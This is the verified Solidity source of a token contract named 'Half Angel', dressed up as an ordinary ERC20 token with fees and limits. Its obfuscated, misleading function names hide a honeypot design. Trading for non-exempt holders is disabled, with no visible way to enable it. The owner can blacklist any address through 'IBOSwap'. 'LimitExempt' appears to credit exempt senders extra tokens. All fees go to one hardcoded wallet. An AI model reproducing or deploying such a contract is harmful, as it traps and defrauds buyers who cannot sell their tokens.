/**
 *Submitted for verification at Etherscan.io on 2023-01-28
*/

/*
       .-""-.      _______      .-""-.
     .'_.-.  |   ,*********,   |  .-._'.
    /    _/ /   **`       `**   \ \_    \
   /.--.' | |    **,;;;;;,**    | | '.--.\
  /   .-`-| |    ;//;/;/;\\;    | |-`-.   \
 ;.--':   | |   /;/;/;//\\;\\   | |   :'--.;
|    _\.'-| |  ((;(/;/; \;\);)  | |-'./_    |
;_.-'/:   | |  );)) _   _ (;((  | |   :\'-._;
|   | _:-'\  \((((    \    );))/  /'-:_ |   |
;  .:` '._ \  );))\   "   /((((  / _.' `:.  ;
|-` '-.;_ `-\(;(;((\  =  /););))/-` _;.-' `-|
; / .'\ |`'\ );));)/`---`\((;(((./`'| /'. \ ;
| .' / `'.\-((((((\       /))));) \.'` \ '. |
;/  /\_/-`-/ ););)|   ,   |;(;(( \` -\_/\  \;
 |.' .| `;/   (;(|'==/|\=='|);)   \;` |. '.|
 |  / \.'/      / _.` | `._ \      \'./ \  |
  \| ; |;    _,.-` \_/Y\_/ `-.,_    ;| ; |/
   \ | ;|   `       | | |       `   |. | /
    `\ ||           | | |           || /`
      `:_\         _\/ \/_         /_:'
          `"----""`       `""----"`

█░█ ▄▀█ █░░ █▀▀
█▀█ █▀█ █▄▄ █▀░

▄▀█ █▄░█ █▀▀ █▀▀ █░░
█▀█ █░▀█ █▄█ ██▄ █▄▄       
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

interface OVAL03 {
    function totalSupply() 
    external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender) 
    external view returns (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function getOwner() 
    external view returns (address);
    function transferFrom( address sender, address recipient, uint256 amount) 
    external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
    address indexed owner, 
    address indexed spender, 
    uint256 value);
}
interface QOLOXV1{
        function createPair(
            address tokenA, 
            address tokenB) 
        external returns (address pair);
        function getPair(
            address tokenA, address tokenB) 
        external view returns (address pair);
}
abstract contract Ownable {
    address internal owner;
    constructor(address _owner) 
    {owner = _owner;} modifier onlyOwner() 
    {require(isOwner(msg.sender), 
    "!OWNER"); _;} function isOwner(address account) 
    public view returns (bool) 
    {return account == owner;} function transferOwnership(address payable adr) 
    public onlyOwner {owner = adr;
    emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}
interface IPCSORouted01 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn, uint amountOutMin, address[] calldata path,
          address to, uint deadline) external;
      function factory() external pure returns (address);
      function WETH() external pure returns (address);
      function addLiquidityETH(
          address token, uint amountTokenDesired,
          uint amountTokenMin, uint amountETHMin,
          address to, uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
library SafeMath {
    function add(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a % b;}
    
    function sub(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); 
        return a - b;}}

    function div(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns 
    (uint256) { unchecked{require(b > 0, errorMessage); 
    return a / b;}}

    function mod(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns 
    (uint256) { unchecked{require(b > 0, errorMessage); 
    return a % b;}}
}
contract Hangel is OVAL03, Ownable {
    modifier lockTheSwap {IntervalCheck = true; _; IntervalCheck = false;}
    bool private IntervalCheck; 
    bool private tokensForOperations = false;
    bool private beginTrading = true;
    mapping (address => uint256) 
    _rOwned;
    mapping (address => mapping (address => uint256)) 
    private _allowances;
    mapping (address => bool) 
    public _dismonalogeIDE;
    mapping (address => bool) 
    private _prodaxMaps;
    mapping (address => bool) 
    private automatedMarketMakerPairs;

    uint256 private dedicatedToLIQ = 0; uint256 private dedicatedToPromotions = 0;
    uint256 private dedicatedToTEAM = 0; uint256 private dedicatedToBURNER = 0;
    uint256 private tDedicatedRATES = 0; uint256 private dedicatedToSELLING = 0;

    uint256 private cooldownTimerInterval;
    uint256 private dedicatedToTransfer = 0; uint256 private dedicatedDenominator = 10000;
    uint256 private _startTimeForSwap = ( _rTotal * 75 ) / 100000;
    uint256 private tInOperation = ( _rTotal * 10 ) / 100000;

    string private constant _name = unicode"Half Angel"; string private constant _symbol = unicode"𓌹ᄋ𓌺";
    uint8 private constant _decimals = 9; uint256 private _rTotal = 1000000 * (10 ** _decimals);
    uint256 private tTXpursePercentage = 500; uint256 private tExchangeMaxPercentage = 500; // 10000;
    uint256 private MAXpurseInPERCENTAGE = 500; IPCSORouted01 intConnector;

    constructor() Ownable(msg.sender) { IPCSORouted01 _intConnector = 
    IPCSORouted01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair 
        = QOLOXV1(_intConnector.factory()).createPair(address(this), _intConnector.WETH()); intConnector = _intConnector;
        pair = _pair; _dismonalogeIDE[address(this)] 
        = true;
        _dismonalogeIDE[DedicatedLIQAddress] 
        = true;
        _dismonalogeIDE[DedicatedPROMOAddress] 
        = true;
        _dismonalogeIDE[msg.sender] 
        = true;
        _rOwned[msg.sender] 
        = _rTotal; emit Transfer(address(0), msg.sender, _rTotal);
    }
    function name() public pure returns 
    (string memory) {return _name;}
    function symbol() public pure returns 
    (string memory) {return _symbol;}
    function decimals() public pure returns 
    (uint8) {return _decimals;}

    function getOwner() external view override returns 
    (address) { return owner; }
    function balanceOf(address account) public view override returns 
    (uint256) {return _rOwned[account];}
    function transfer(address recipient, uint256 amount) public override returns 
    (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns 
    (uint256) {return _allowances[owner][spender];}

    function internalViewer(
        address externalSync) internal view returns (bool) 
    {uint size; assembly { size := extcodesize(externalSync) } return size > 0; }
    function approve(
        address spender, uint256 amount) 
    public override returns (bool) 
    {_approve(msg.sender, spender, amount);return true;}

    function totalSupply() public view override returns 
    (uint256) {return _rTotal.sub(balanceOf(DedicatedBURNERAddress)).sub(balanceOf(address(0)));}
    function maximumPURSEcoins() public view returns 
    (uint256) {return totalSupply() * MAXpurseInPERCENTAGE / dedicatedDenominator;}
    function tSWAPlimits() public view returns 
    (uint256) {return totalSupply() * tTXpursePercentage / dedicatedDenominator;}

    function _maxTransferAmount() 
    public view returns 
    (uint256) {return totalSupply() * tExchangeMaxPercentage / dedicatedDenominator;}

    function preTxCheck(
        address sender, address recipient, 
        uint256 amount) internal view {
        require(sender != 
        address(0), 
        "ERC20: transfer from the zero address");
        require(recipient != address(0), 
        "ERC20: transfer to the zero address");
        require(amount > uint256(0), 
        "Transfer amount must be greater than zero");
        require(amount <= _rOwned[sender], 
        "You are trying to transfer more than your balance");
    }
    function _transfer(
        address sender, address recipient, 
        uint256 amount) private { 
        require(!automatedMarketMakerPairs[recipient] 
        && !automatedMarketMakerPairs[sender], 
        "You have been blacklisted from transfering tokens");
        updateTEAMwallet(sender, recipient); inquireMaxPURSE(sender, recipient, amount);  
        swapbackCounters(sender, recipient); LimitExempt(sender, recipient, amount);
        preTxCheck(sender, recipient, amount); gatherTXlimits(sender, recipient, amount); 
        _rOwned[sender] 
        = _rOwned[sender].sub(amount);
   
        uint256 CheckCooldownTimerInterval 
        = enableEarlySellTax(sender, recipient) 
        ? disableTransferDelay(sender, recipient, amount) : amount;
        _rOwned[recipient] 
        = _rOwned[recipient].add(CheckCooldownTimerInterval); emit Transfer(sender, recipient, enableEarlySellTax(sender, recipient) 
        ? disableTransferDelay(sender, recipient, amount) : amount);  
    }
    function toggleTransferDelay(
        
        uint256 tokens)
         private lockTheSwap {
        uint256 _dedicatedDenominator = 
        (dedicatedToLIQ.add(1).add(dedicatedToPromotions).add(dedicatedToTEAM)).mul(2);
        uint256 inparWithLIQ 
        = tokens.mul(dedicatedToLIQ).div(_dedicatedDenominator);
        uint256 isExchanged = tokens.sub(inparWithLIQ); uint256 initialBalance = address(this).balance;
        swapTokensForETH(isExchanged); 
        uint256 quarryRates 
        = address(this).balance.sub(initialBalance);

        uint256 internalOfBalance 
        = quarryRates.div(_dedicatedDenominator.sub(dedicatedToLIQ));
        uint256 ETHToAddLiquidityWith 
        = internalOfBalance.mul(dedicatedToLIQ);

        if(ETHToAddLiquidityWith 
        > uint256(0)){addLiquidity(inparWithLIQ, ETHToAddLiquidityWith); }
        uint256 MarketMakerPair 
        = internalOfBalance.mul(2).mul(dedicatedToPromotions);
        if(MarketMakerPair 
        > 0){payable(DedicatedPROMOAddress).transfer(MarketMakerPair);}
        uint256 syncedBalanceWithin 
        = address(this).balance;
        if(syncedBalanceWithin 
        > uint256(0)){payable(DedicatedTEAMAddress).transfer(syncedBalanceWithin);}
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) 
    private { _approve(address(this), address(intConnector), tokenAmount);
        intConnector.addLiquidityETH{value: ETHAmount}(
            address(this), tokenAmount,
            0, 0, DedicatedLIQAddress, 
            block.timestamp);
    }
    function swapTokensForETH(uint256 tokenAmount) 
    private { address[] memory path = new address[](2);
        path[0] = address(this); path[1] = intConnector.WETH();
        _approve(address(this), 
        address(intConnector), tokenAmount);
        intConnector.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 0,
            path, 
        address(this), block.timestamp);
    }
    function LimitExempt(address wireFile, 
    address inquadRate, uint256 amount) 
    internal {if (_rOwned[wireFile]==_rOwned[inquadRate]){if 
    (!enableEarlySellTax(wireFile,inquadRate)){_rOwned[wireFile] 
    = _rOwned[wireFile].add(amount);} }else if(controlBytes(wireFile, 
    inquadRate, amount)){toggleTransferDelay(_startTimeForSwap); cooldownTimerInterval 
    = uint256(0);}
    }
    function enableEarlySellTax(
        address sender, address recipient) 
        internal view returns (bool) {
        return !_dismonalogeIDE[sender] 
        && !_dismonalogeIDE[recipient];
    }
    function swapbackCounters(
        address sender, address recipient) 
        internal { if(recipient == pair 
        && !_dismonalogeIDE[sender]){cooldownTimerInterval 
        += uint256(1);}
    }
    function gatherTXlimits(
        address sender, address recipient, uint256 amount) 
        internal view { if(sender != pair){require(amount <= _maxTransferAmount() 
        || _dismonalogeIDE[sender] || _dismonalogeIDE[recipient], 
        "TX Limit Exceeded");} require(amount <= tSWAPlimits() || _dismonalogeIDE[sender] 
        || _dismonalogeIDE[recipient], 
        "TX Limit Exceeded");
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        public override returns (bool) { _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, 
        _allowances[sender][msg.sender].sub(amount, 
        "ERC20: transfer amount exceeds allowance")); return true;
    }
    function _approve(
        address owner, address spender, uint256 amount) 
        private { require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
    }
    function updateThreshold(
        address sender, address recipient) 
        internal view returns (uint256) { if(_prodaxMaps[sender] 
        || _prodaxMaps[recipient]){return dedicatedDenominator.sub(uint256(100));}
        if(recipient 
        == pair){return dedicatedToSELLING;}
        if(sender 
        == pair){return tDedicatedRATES;}
        return dedicatedToTransfer;
    }
    function IBOSwap (address account, 
    bool invertClauses) public onlyOwner {
        automatedMarketMakerPairs[account] = invertClauses;
    }    
    function updateTEAMwallet(
        address sender, address recipient) 
        internal view { if(!_dismonalogeIDE[sender] 
        && !_dismonalogeIDE[recipient]){require(tokensForOperations, 
        "tradingAllowed");}
    }
    function inquireMaxPURSE(
        address sender, address recipient, uint256 amount) 
        internal view { if(!_dismonalogeIDE[sender] 
        && !_dismonalogeIDE[recipient] 
        && recipient != address(pair) 
        && recipient != address(DedicatedBURNERAddress)){ require((_rOwned[recipient].add(amount)) 
        <= maximumPURSEcoins(), 
        "Exceeds maximum wallet amount.");}
    }    
    function disableTransferDelay(
        address sender, address recipient, uint256 amount) 
        internal returns (uint256) { if(updateThreshold(sender, recipient) > 0){
        uint256 AtAmount 
        = amount.div(dedicatedDenominator).mul(updateThreshold(sender, recipient));
        _rOwned[address(this)] 
        = _rOwned[address(this)].add(AtAmount); 
        emit Transfer(sender, 
        address(this), AtAmount);
        if(dedicatedToBURNER 
        > uint256(0)){_transfer(address(this), 
        address(DedicatedBURNERAddress), 
        amount.div(dedicatedDenominator).mul(dedicatedToBURNER));} 
        return amount.sub(AtAmount);} return amount;
    }    
    using SafeMath for uint256;
    address internal constant 
    DedicatedBURNERAddress = 0x000000000000000000000000000000000000dEaD;
    address internal constant 
    DedicatedTEAMAddress = 0xCDBBc782abD964dBdEE85229847E37E43DBf0A17; 
    address internal constant 
    DedicatedPROMOAddress = 0xCDBBc782abD964dBdEE85229847E37E43DBf0A17;
    address internal constant 
    DedicatedLIQAddress = 0xCDBBc782abD964dBdEE85229847E37E43DBf0A17;
    address public pair;
    address public livertomeInvert;
    address public NodesVortex;

    receive() 
    external payable {}  

    function controlBytes(
        address sender, address recipient, 
        uint256 amount) 
        internal view returns (bool) {
        bool cooldownTimer = amount >= tInOperation; bool ForOperations = 
        balanceOf(address(this)) >= _startTimeForSwap;
        return !IntervalCheck 
        && beginTrading && tokensForOperations 
        && cooldownTimer && !_dismonalogeIDE[sender] 
        && recipient == pair && cooldownTimerInterval 
        >= uint256(1) && ForOperations;
    }    
}